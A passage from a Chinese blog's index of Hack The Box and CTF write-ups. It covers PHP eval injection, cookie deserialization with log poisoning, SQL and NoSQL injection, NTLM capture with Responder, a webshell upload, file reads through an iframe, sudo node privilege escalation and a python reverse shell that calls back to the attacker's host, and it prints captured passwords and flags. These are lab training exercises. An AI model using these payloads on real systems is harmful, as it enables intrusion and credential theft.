req.Header.Add(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;)\n        resp, err := client.Do(req)\n        if err != nil &#123;\n            fmt.Println(&quot;Error:&quot;, err)\n        &#125;\n        defer resp.Body.Close()\n\n        if resp.StatusCode == 200 &#123;\n            bodyBytes, _ := ioutil.ReadAll(resp.Body)\n            bodyString := string(bodyBytes)\n\n            if strings.Contains(bodyString, &quot;No search results&quot;) &#123;\n                flag += string(chars[i])\n                fmt.Println(&quot; success&quot;)\n                fmt.Printf(&quot;[+] %s\\n&quot;, flag)\n                break\n            &#125;\n        &#125;\n        fmt.Println(&quot; failed&quot;)\n\n        if flag[len(flag)-1] == &#39;&#125;&#39; &#123;\n            break\n        &#125;\n    &#125;\n\n    fmt.Printf(&quot;flag: %s\\n&quot;, flag)\n&#125;\n\nLoveTok题目给了源码，下载下来查看\n打开页面，点击最底下的按钮出现format参数，猜测这个参数有利用点，去源码中找到此参数\n\n在TimeModel.php中找到了$format\n&lt;?php\nclass TimeModel\n&#123;\n    public function __construct($format)\n    &#123;\n        $this-&gt;format = addslashes($format);\n\n        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];\n        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;\n    &#125;\n\n    public function getTime()\n    &#123;\n        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);\n        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;\n    &#125;\n&#125;\n\n这里用了addslashes()——– 使用反斜线引用字符串\n注意下面有个eval()函数，将$this-&gt;format包含在了里面，也就意味着，我们可以控制format的值来进行eval()执行代码。\n所以，第一步绕过addslashes()的转义\n使用php复杂变量进行绕过\nhttps://www.programmersought.com/article/30723400042/\n简单来说，${phpinfo()}，会先执行phpinfo(),然后将返回值作为变量名\n\n这里“还是会被转义，所以需要换个方式，不使用到这些字符\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=ls\n\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=ls /\n\n\n?format=$&#123;system($_GET[1])&#125;&amp;1=cat /flagLpfG2\n\n\n拿到flag，这就是一道php命令执行的题。\nToxic给了源码\n&lt;?php\nspl_autoload_register(function ($name)&#123;\n    if (preg_match(&#39;/Model$/&#39;, $name))\n    &#123;\n        $name = &quot;models/$&#123;name&#125;&quot;;\n    &#125;\n    include_once &quot;$&#123;name&#125;.php&quot;;\n&#125;);\n\nif (empty($_COOKIE[&#39;PHPSESSID&#39;]))\n&#123;\n    $page = new PageModel;\n    $page-&gt;file = &#39;/www/index.html&#39;;\n\n    setcookie(\n        &#39;PHPSESSID&#39;, \n        base64_encode(serialize($page)), \n        time()+60*60*24, \n        &#39;/&#39;\n    );\n&#125; \n\n$cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);\nunserialize($cookie);\n\n这里可以看到，cookie是文件读取目录经过序列化之后再进行base64编码后生成的\n抓个包\n\ndecode\n\n所以我们可以逆向去读取敏感文件\n\n成功读取\n\n注意到最后一行，nginx，想到日志文件包含\nnginx的log在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log，其中access.log可以打开。\n尝试读一下\n\n\n可以看到日志文件为请求头文件\n那么我们可以将请求头中的User-Agent字段更改为恶意代码，这样就会自动写入日志文件中，然后被执行。\n\n再次访问日志文件，之前更改了ua的访问已经被记录\n\nphp代码也已经被执行，回显了flag\n","tags":["打靶","HTB","Web"]},{"title":"Hack the box-Starting point TIER0通关","url":"/2023/02/01/Hack%20the%20box-Starting%20point%20TIER0%E9%80%9A%E5%85%B3/","content":"TIER0Meow靶机\n1）下载openvpn的配置，进行连接\n\n查看是否连接成功\n\n2）创建一个新的实例：新实例内网ip为10.129.98.33\n\n3）接下来就是一些问答题\n\n1.What does the acronym VM stand for?（VM是什么的缩写）virtual machine2.What tool do we use to interact with the operating system in order to start our vpn connection?(我们用什么工具与操作系统进行交互进而开启我们的vpn连接？)terminal3.What service do we use to form our vpn connection?（我们用什么服务形成我们vpn连接？）openvpn4.What is the abreviated name for a tunnel interface in the output of your vpn boot-up sequence output?（vpn启动后隧道接口的缩写名称是什么）tun5.What tool do we use to test our connection to the target?（我们用什么工具来测试与目标靶机的连接？）ping6.What is the name of the tool we use to scan the target’s ports?（我们用什么工具来扫描目标靶机的端口？）nmap7.What service do we identify on port 23&#x2F;tcp during our scans?（在我们的扫描结果中tcp23端口被我们认定为是什么服务）telnet8.What username ultimately works with the remote management login prompt for the target?（哪个用户名最终可以成功远程登录到目标靶机？）root\n9.获取flag\nnmap探测开放端口\n\n扫出23端口telnet服务\n尝试连接\n\nroot用户，空密码连接成功，拿到shell，找flag\n\n\nFawn靶机1）vpn连接，不做展示了\n2）创建实例拿到ip\n\n3）接下来几个问答题 \n1.What does the 3-letter acronym FTP stand for?（FTP是什么的简称？）\nFile Transfer Protocol\n2.Which port is the FTP service active on usually?（通常情况下，FTP活跃在哪个端口？）\n21 tcp\n3.What acronym is used for the secure version of FTP?（安全版本的FTP的简称是什么？）\nsftp\n4.What is the command we can use to send an ICMP echo request to test our connection to the target?\nping\n5.From your scans, what version is FTP running on the target?（根据你的扫描，目标上运行的FTP是什么版本?）\n-sV 探测服务&#x2F;版本信息 我们可以看到 开放21端口的ftp协议 版本是 vsftpd 3.0.3\n\n6.From your scans, what OS type is running on the target? \nUnix\n7.What is the command we need to run in order to display the ‘ftp’ client help menu?（为了显示“ftp”客户端帮助菜单，我们需要运行什么命令?）\nftp -h\n8.What is username that is used over FTP when you want to log in without having an account? \nFTP没有账户时候我们可以用username: anonymous 采用匿名访问;\n9.What is the response code we get for the FTP message ‘Login successful’? \n230\n\nFTP状态码\n\n### 1xx\n\n*肯定的初步答复，这些状态代码指示一项操作已经成功开始，但客户端希望在继续操作新命令前得到另一个答复。*\n\n- 110 重新启动标记答复。\n- 120 服务已就绪，在 nnn 分钟后开始。\n- 125 数据连接已打开，正在开始传输。\n- 150 文件状态正常，准备打开数据连接。\n\n### 2xx\n\n*肯定的完成答复，一项操作已经成功完成。客户端可以执行新命令。*\n\n- 200 命令确定。\n- 202 未执行命令，站点上的命令过多。\n- 211 系统状态，或系统帮助答复。\n- 212 目录状态。\n- 213 文件状态。\n- 214 帮助消息。\n- 215 NAME 系统类型，其中，NAME 是 Assigned Numbers 文档中所列的正式系统名称。\n- 220 服务就绪，可以执行新用户的请求。\n- 221 服务关闭控制连接。如果适当，请注销。\n- 225 数据连接打开，没有进行中的传输。\n- 226 关闭数据连接。请求的文件操作已成功（例如，传输文件或放弃文件）。\n- 227 进入被动模式 (h1,h2,h3,h4,p1,p2)。\n- 230 用户已登录，继续进行。\n- 250 请求的文件操作正确，已完成。\n- 257 已创建“PATHNAME”。\n\n### 3xx\n\n*肯定的中间答复，该命令已成功，但服务器需要更多来自客户端的信息以完成对请求的处理。*\n\n- 331 用户名正确，需要密码。\n- 332 需要登录帐户。\n- 350 请求的文件操作正在等待进一步的信息。\n\n### 4xx\n\n*瞬态否定的完成答复，该命令不成功，但错误是暂时的。如果客户端重试命令，可能会执行成功。*\n\n- 421 服务不可用，正在关闭控制连接。如果服务确定它必须关闭，将向任何命令发送这一应答。\n- 425 无法打开数据连接。\n- 426 Connection closed; transfer aborted.\n- 450 未执行请求的文件操作。文件不可用（例如，文件繁忙）。\n- 451 请求的操作异常终止：正在处理本地错误。\n- 452 未执行请求的操作。系统存储空间不够。\n\n## 5xx\n\n*永久性否定的完成答复，该命令不成功，错误是永久性的。如果客户端重试命令，将再次出现同样的错误。*\n\n- 500 语法错误，命令无法识别。这可能包括诸如命令行太长之类的错误。\n- 501 在参数中有语法错误。\n- 502 未执行命令。\n- 503 错误的命令序列。\n- 504 未执行该参数的命令。\n- 530 未登录。\n- 532 存储文件需要帐户。\n- 550 未执行请求的操作。文件不可用（例如，未找到文件，没有访问权限）。\n- 551 请求的操作异常终止：未知的页面类型。\n- 552 请求的文件操作异常终止：超出存储分配（对于当前目录或数据集）。\n- 553 未执行请求的操作。不允许的文件名。\n\n## 6xx\n\n- 600 Series，Replies regarding confidentiality and integrity\n- 631 Integrity protected reply.\n- 632 Confidentiality and integrity protected reply.\n- 633 Confidentiality protected reply.\n\n\n\n10.There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. \nls\n11.What is the command used to download the file we found on the FTP server? \nget\n下载文件通常用get和mget这两条命令。\n a) get \n 格式：get [remote-file] [local-file]\n 将文件从远端主机中传送至本地主机中。\n 如要获取远程服务器上/usr/your/1.htm，则\n\nftp&gt; get /usr/your/1.htm 1.htm (回车)\n\n b) mget　　　　　　\n 格式：mget [remote-files]\n 从远端主机接收一批文件至本地主机。\n 如要获取服务器上/usr/your/下的所有文件，则\n\nftp&gt; cd /usr/your/\n ftp&gt; mget *.* (回车)\n\n 此时每下载一个文件，都会有提示。如果要除掉提示，则在mget *.* 命令前先执行:prompt off\n\n12.获取flag,ftp连接\n\n拿到flag\nDancing靶机连接vpn,创建实例\n1.What does the 3-letter acronym SMB stand for?（SMB是什么的简称？）\nServer Message Block\n2.What port does SMB use to operate at?（用什么端口去操作SMB?）\n445\n3.What is the service name for port 445 that came up in our nmap scan?（从扫描结果来看，445端口的服务名称是什么？）\nmicrosoft-ds\n4.What is the flag or switch we can use with the SMB tool to list the contents of the share?（我们可以用SMB工具哪个“标识”或者“开关”来列举出分享的文件？）\n-L\n5.How many shares are there on Dancing? \n6.What is the name of the share we are able to access in the end with a blank password?\nWorkShares\n7.What is the command we can use within the SMB shell to download the files we find? \nget\nnmap端口扫描\n\n开放了3个服务135: msrpc （MicroSoft Remote Procedure Call，微软远程过程调用） 这是windos系统特有的服务139:netbios-ssn 用于提供文件共享服务,主要用于企业内部网之间互相访问 也是微软的服务445:就是我们说的SMB\nsmb连接\n\n访问WorkShares，找到flag.txt，get到本地查看\n\nRedeemer靶机常规连接vpn,创建实例\n\nnmap扫描\n\n得到redis 版本号5.0.7\n用redis-cli连接\ninfo看到有四个键\n\nkeys * \n\n得到flag\n1.Which TCP port is open on the machine?\n6379\n2.Which service is running on the port that is open on the machine?\nredis\n3.What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database\nIn-memory Database\n4.Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.\nredis-cli\n5.Which flag is used with the Redis command-line utility to specify the hostname?\n-h\n6.Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?\ninfo\n7.What is the version of the Redis server being used on the target machine?\n5.0.7\n8.Which command is used to select the desired database in Redis?（在Redis中使用哪个命令来选择所需的数据库?）\nselect\n9.How many keys are present inside the database with index 0?\n4\n10.Which command is used to obtain all the keys in a database?（获取数据库中所有密钥的命令是什么?）\n**keys ***\n总结这个TIER0,主要就是让我们了解Telnet、ftp、SMB、Redis这些服务，后面还有四个靶机分别为RDP：用xfreerdp 来连接、目录爆破：用gobuster来爆破、 MongoDB、Rsync，后面四个靶机需要vip，不过也很简单，没必要打。\n","tags":["打靶","渗透测试","HTB"]},{"title":"Hack the box-Starting point TIER1通关","url":"/2023/02/02/Hack%20the%20box-Starting%20point%20TIER1%E9%80%9A%E5%85%B3/","content":"TIER1Appointment靶机\n常规nmap扫端口\n\n80端口开放了一个web服务，访问\n\n一个登录窗口，题目提示sql注入，输入username：admin’# 登录\n\n拿到flag\n1.SQL全称是什么？\n答案：Structured Query Language。中文名字叫结构化查询语言\n2.最常见的SQL漏洞类型是什么？\n答案：SQL injection #SQL注入\n3.PII代表什么意思？\n答案：personally identifiable information，通过百度来的，个人身份信息或者个人验证信息\n4.OWASP 前 10 名列表将此漏洞的分类命名为什么？\n答案：A03:2021-Injection\n5.80端口跑的是什么服务以及什么版本？\n答案：上面说过了\n6.https的端口是什么？\n答案：443\n7.web应用的文件夹叫什么？\n答案：directory\n8.Not found的响应代码是什么？\n答案：404\n9.在 Gobuster 中使用什么开关来指定我们正在寻找目录而不是子域？\n答案：dir，Gobuster是一个目录猜解工具\nhttps://github.com/OJ/gobuster\n10.使用什么符号注释代码？答案：#\n11.If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? \n答案：Congratulations\nSequel靶机常规nmap扫端口\n扫出3306 mariadb服务\n尝试连接\n\n拿到flag\n1.扫描时，mysql跑在哪个端口？\n3306\n2.目标主机上跑的mysql是什么版本？\nmariadb\n3.我们需要使用什么开关来指定 MySQL 服务的登录用户名？\n-u\n4.哪个用户名允许我们在不提供密码的情况下登录 MariaDB？\nroot\n5.使用什么符号可以获取一张表的所有信息?\n\n\n\n6.使用什么符号结束一个查询?;\n7.这个MySQL实例中有三个数据库在所有MySQL实例中都是通用的。这个主机所特有的第四个名字是什么?\nhtb\nCrocodile靶机常规扫端口\n\nftp连接\n\n利用得到的账号密码登录80端口网页\n\n拿到flag\n\n1.在nmap中使用默认脚本扫描的是什么命令？\n-sC。\n2.21端口上跑的服务的版本是什么？\nvsftpd3.0.3\n3.允许ftp匿名登录的代码是什么？\n230\n4.什么命令可以用于下载ftp上面的文件\nget\n6.username列表中，听起来权限比较高的用户名是什么？\nadmin\n7.What version of Apache HTTP Server is running on the target host? \napache httpd 2.4.41\n8.What switch can we use with Gobuster to specify we are looking for specific filetypes? \n-X\n9.我们可以使用目录蛮力识别哪个PHP文件，从而提供向web服务进行身份验证的机会?\n login.php\nResponder靶机1.当使用IP地址访问web服务时，我们被重定向到的域是什么?\nunika.htb\n\n2.服务器上使用哪种脚本语言生成网页?\nphp\n3.用于加载不同语言版本的网页的URL参数名称是什么?\npage\n4.Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.. &#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”\n..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts\n5.Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe” \n&#x2F;&#x2F;10.10.14.6&#x2F;somefile\n6.What does NTLM stand for? \nNew Technology LAN Manager\n7.我们在Responder实用程序中使用哪个标志来指定网络接口?\n-i \n8.有几个工具可以使用NetNTLMv2挑战&#x2F;响应，并尝试数百万个密码，以查看是否有任何密码生成相同的响应。一个这样的工具通常被称为“john”，但全名是什么?\njohn the ripper\n9.What is the password for the administrator user? \nbadminton\n10.我们将使用 Windows 服务（即在box上运行）使用我们恢复的密码远程访问 Responder 机器。它侦听的 TCP 端口是什么？\n5985\n因为重定向域的问题，我们是访问不了的会报错，这里修改一下hosts文件\n\nnmap扫端口\nifconfig查看本机在内网中的ip\n\nresponder开启监听\n\n网页访问远程文件包含\n\n访问后监听到hash值\n接下来使用john破解，\n\n得到administrator账号密码\n之前扫到一个5985端口开了个winrm服务，使用evil-winrm远程连接\n\n拿到shell\n\n查找flag\n\n拿到flag\nThree靶机常规nmap\n\n访问web服务\n\n通过邮箱联想到域名\n可以通过gobuster来爆破子域名，然后绑定ip 子域名\n题目有提示说是s3.thetoppers.htb\n\n添加解析\n\n访问子域名，回显\n\ns3是亚马逊的一个对象存储服务\nhttps://aws.amazon.com/cn/s3/\n访问并执行命令\n\n本来想尝试执行cd命令，发现没办法，查看提示可以执行cp命令，那么就可以上传一句话木马，拿到shell\n\n先本地生成一个一句话木马shell.php\n\n上传成功\n\n访问，直接执行命令即可拿到flag\n\n\n\n也可以通过蚁剑等webshell工具连接\n或者通过反弹shell\n方法很多，毕竟已经把马传到了服务器。\n问答题就不写了，答案过程中都有。\n总结  tier1也是没什么难的地方，第一个靶机web服务登录框sql注入，第二个靶机3306mariadb连接查询，第三个靶机ftp连接拿后台账号密码，第四个靶机远程文件包含、Responder监听、john破解拿到winrm服务用户密码，evil-winrm远程连接，第五个靶机gobuster爆破子域名、awscli上传木马、拿shell。后面还有五个vip靶机，就没打了。\n","tags":["打靶","渗透测试","HTB"]},{"title":"HTB-easy Machines系列","url":"/2023/02/12/HTB-easy%20Machines%E7%B3%BB%E5%88%97/","content":"Stockernmap扫描┌──(root💀kali)-[~]\n└─# nmap -sV 10.10.11.196\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-02-10 20:53 EST\nNmap scan report for stocker.htb (10.10.11.196)\nHost is up (2.1s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.41 seconds\n\n\n\ncurl发现80端口的域名\n└─# curl 10.10.11.196 --head\nHTTP/1.1 301 Moved Permanently\nServer: nginx/1.18.0 (Ubuntu)\nDate: Sat, 11 Feb 2023 02:21:56 GMT\nContent-Type: text/html\nContent-Length: 178\nConnection: keep-alive\nLocation: http://stocker.htb\n\n在&#x2F;etc&#x2F;hosts中添加，访问网页，没什么有用信息\n子域名枚举工具很多，只有字典选得好就行了，我这里使用了kali的字典集seclists下的子域名爆破字典。\n┌──(root💀kali)-[~]\n└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.stocker.htb\n\n        /&#39;___\\  /&#39;___\\           /&#39;___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://FUZZ.stocker.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ndev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 953ms]\n\n爆出dev子域名，添加到etc&#x2F;hosts文件，访问，是个登录窗口，随意输入抓个包看看\nNOsql注入相关链接\nrequst\nPOST /login HTTP/1.1\n\nHost: dev.stocker.htb\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\nAccept-Encoding: gzip, deflate\n\nContent-Type: application/x-www-form-urlencoded\n\nContent-Length: 29\n\nOrigin: http://dev.stocker.htb\n\nConnection: close\n\nReferer: http://dev.stocker.htb/login\n\nCookie: connect.sid=s%3AFWIdQ3-xL3iYmpJqnfHYkkn1fz-VC_0m.W10CYIEr6Dtiy%2Bg8VuESaTI84n6lEd17mWNsaYNDFn0\n\nUpgrade-Insecure-Requests: 1\n\n\n\nusername=admin&amp;password=admin\n\nrespose\nHTTP/1.1 302 Found\n\nServer: nginx/1.18.0 (Ubuntu)\n\nDate: Sat, 11 Feb 2023 02:16:13 GMT\n\nContent-Type: text/html; charset=utf-8\n\nContent-Length: 92\n\nConnection: close\n\nX-Powered-By: Express\n\nLocation: /login?error=login-error\n\nVary: Accept\n\n\n\n&lt;p&gt;Found. Redirecting to &lt;a href=&quot;/login?error=login-error&quot;&gt;/login?error=login-error&lt;/a&gt;&lt;/p&gt;\n\n使用bp抓包，将登录参数改为json代码，同时将Content-Type随之更改\nrequst\nPOST /login HTTP/1.1\n\nHost: dev.stocker.htb\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\nAccept-Encoding: gzip, deflate\n\nContent-Type: application/json\n\nContent-Length: 55\n\nOrigin: http://dev.stocker.htb\n\nConnection: close\n\nReferer: http://dev.stocker.htb/login\n\nCookie: connect.sid=s%3AFWIdQ3-xL3iYmpJqnfHYkkn1fz-VC_0m.W10CYIEr6Dtiy%2Bg8VuESaTI84n6lEd17mWNsaYNDFn0\n\nUpgrade-Insecure-Requests: 1\n\n\n\n&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;\n\nrespose\nHTTP/1.1 302 Found\n\nServer: nginx/1.18.0 (Ubuntu)\n\nDate: Sat, 11 Feb 2023 02:55:44 GMT\n\nContent-Type: text/html; charset=utf-8\n\nContent-Length: 56\n\nConnection: close\n\nX-Powered-By: Express\n\nLocation: /stock\n\nVary: Accept\n\nSet-Cookie: connect.sid=s%3AQBv56UBK59KlhesFqTHFoMs8cz_xJDRs.nXEOSd52fW7zT2Ojs4Hn%2Bu9oiUmKPEaSjWk8VKjTbyc; Path=/; HttpOnly\n\n\n\n&lt;p&gt;Found. Redirecting to &lt;a href=&quot;/stock&quot;&gt;/stock&lt;/a&gt;&lt;/p&gt;\n\n重定向到了&#x2F;stock页面，在浏览器中查看\n\n是个购物网站，简单走一下流程，选购好东西后，点view cart提交账单后，弹出以下界面\n\n显示orderID和一个超链接，点击，会定位到&#x2F;api&#x2F;po&#x2F;orderID,同时显示所购买的商品\n\n抓包查看具体数据包\nPOST /api/order HTTP/1.1\n\nHost: dev.stocker.htb\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: */*\n\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\nAccept-Encoding: gzip, deflate\n\nReferer: http://dev.stocker.htb/stock\n\nContent-Type: application/json\n\nOrigin: http://dev.stocker.htb\n\nContent-Length: 162\n\nConnection: close\n\nCookie: connect.sid=s%3AXCU2j-Ge2IfqK8UyCTbeoP3b5cXEsFDl.tML7SoE%2BTzG8r0FHxV8l66ypAgjazZEBEreIW5GClLw\n\n\n\n&#123;&quot;basket&quot;:[&#123;&quot;_id&quot;:&quot;638f116eeb060210cbd83a8d&quot;,&quot;title&quot;:&quot;Cup&quot;,&quot;description&quot;:&quot;It&#39;s a red cup.&quot;,&quot;image&quot;:&quot;red-cup.jpg&quot;,&quot;price&quot;:32,&quot;currentStock&quot;:4,&quot;__v&quot;:0,&quot;amount&quot;:1&#125;]&#125;\n\nHTTP/1.1 200 OK\n\nServer: nginx/1.18.0 (Ubuntu)\n\nDate: Sat, 11 Feb 2023 03:08:25 GMT\n\nContent-Type: application/json; charset=utf-8\n\nContent-Length: 53\n\nConnection: close\n\nX-Powered-By: Express\n\nETag: W/&quot;35-U3nSPD6OYldWF6R+73GibB6cpYA&quot;\n\n\n\n&#123;&quot;success&quot;:true,&quot;orderId&quot;:&quot;63e706a93bf31dab4f32ab3c&quot;&#125;\n\n从数据包可以看点requst中json数据中的title会在网页回显，而response中的orderId会在url中显示。这里大概率可以利用本地文件包含。\n本地文件包含将json中的title数据更改为：”title”: “&lt;iframe src&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd height:750px width: 750px&gt;“\n\n回显成功，这时候我们可以去读源码获取有用信息\n利用wappalyzer得到编程语言为node，那么就应该去读取index.js\n\n将title数据改为 “title”: “&lt;iframe src&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;dev&#x2F;index.js height:10000px width: 8000px&gt;“\n\n我们可以看到 index.js 文件的其中一行连接到 mongodb，并且密码以明文形式显示。可以尝试使用获得的凭据 ssh 进入服务器\nangoose:IHeardPassphrasesArePrettySecure\n-bash-5.0$ pwd\n/home/angoose\n-bash-5.0$ ls -a\n.  ..  .bash_history  .bash_logout  .bashrc  .cache  .mongodb  n3ym4r.js  .profile  user.txt  .viminfo\n-bash-5.0$ cat user.txt\nd750aa79aa54e49f0c4fd0b58c495a68\n\n拿到user flag\n提权执行“sudo -l”，可以看到如果我们执行“.js”类型的文件，就能立即获得 root 访问权限\n那么创建一个.js文件\n这里路径是怎么得出的呢 Linux系统下&#x2F;home 和&#x2F;usr为同级目录要从usr转到home需要往回三次\n-bash-5.0$ vim n3ym4r.js\n-bash-5.0$ cat n3ym4r.js\nrequire(&quot;child_process&quot;).spawn(&quot;/usr/bin/bash&quot;, &#123;stdio:[0, 1, 2]&#125;)\n-bash-5.0$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/n3ym4r.js\n\nroot@stocker:/home/angoose# whoami\nroot\nroot@stocker:/home/angoose# ls\nn3ym4r.js  user.txt\nroot@stocker:/home/angoose# cd ~\nroot@stocker:~# ls\nroot.txt\nroot@stocker:~# cat root.txt\n8ed1a75f8d894c3b51070771dfe4ca67\nroot@stocker:~# \n\n拿到root flag\nPreciousnmap扫描┌──(root💀kali)-[~]\n└─# nmap -sC -sV 10.10.11.189\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-02-11 06:56 EST\nNmap scan report for precious.htb (10.10.11.189)\nHost is up (1.4s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)\n|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)\n|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)\n80/tcp open  http    nginx 1.18.0\n| http-server-header: \n|   nginx/1.18.0\n|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15\n|_http-title: Convert Web Page to PDF\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 38.91 seconds\n\nNmap 显示 80 和 22 端口已打开，80 端口将我们重定向到 precious.htb\n将其添加到 /etc/hosts 文件中\nweb漏洞发现访问页面，网站功能为将输入的url转换为pdf\n\n本地起个web服务\n┌──(root💀kali)-[~]\n└─# python3 -m http.server 80\n\n网页输入我们本机ip，如我们所想生成了一个pdf\n\nF12\n\n看到pdf版本为pdfkit v0.8.6,google一下\n\n存在命令注入漏洞\n命令注入https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795\n简单说在url后跟任意参数，值为想要执行的命令即可\n\n\n成功回显\n反弹shell本地开启nc监听\n└─# nc -lvvp 9999            \nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::9999\nNcat: Listening on 0.0.0.0:9999\n\n网页输入\nhttp://10.10.16.8/?n=%20`python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.8&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;`\n\n┌──(root💀kali)-[~]\n└─# nc -lvvp 9999            \nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::9999\nNcat: Listening on 0.0.0.0:9999\nNcat: Connection from 10.10.11.189.\nNcat: Connection from 10.10.11.189:39340.\n$ ls\nls\napp  config  config.ru  Gemfile  Gemfile.lock  pdf  public\n$ cd ..\ncd ..\n$ ls\nls\nhtml  pdfapp\n$ cd ..\ncd ..\n$ ls\nls\nbackups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www\n$ cd ..\ncd ..\n$ ls\nls\nbin   home            lib64       mnt   run   tmp      vmlinuz.old\nboot  initrd.img      libx32      opt   sbin  usr\ndev   initrd.img.old  lost+found  proc  srv   var\netc   lib             media       root  sys   vmlinuz\n$ cd home\ncd home\n$ ls\nls\nhenry  ruby\n$ cd ruby\ncd ruby\n$ ls -a\nls -a\n.   .bash_history  .bashrc  .cache  .local    .ssh\n..  .bash_logout   .bundle  .gnupg  .profile\n$ cd .bundle    \ncd .bundle\n$ ls\nls\nconfig\n$ cat config \ncat config\n---\nBUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;\n\n在&#x2F;home&#x2F;ruby&#x2F;.bundle&#x2F;config文件下，得到henry用户密码Q3c1AqGHtoI0aXAYFH\nssh连接┌──(root💀kali)-[~]\n└─# ssh henry@10.10.11.189  \nhenry@10.10.11.189&#39;s password: \nLinux precious 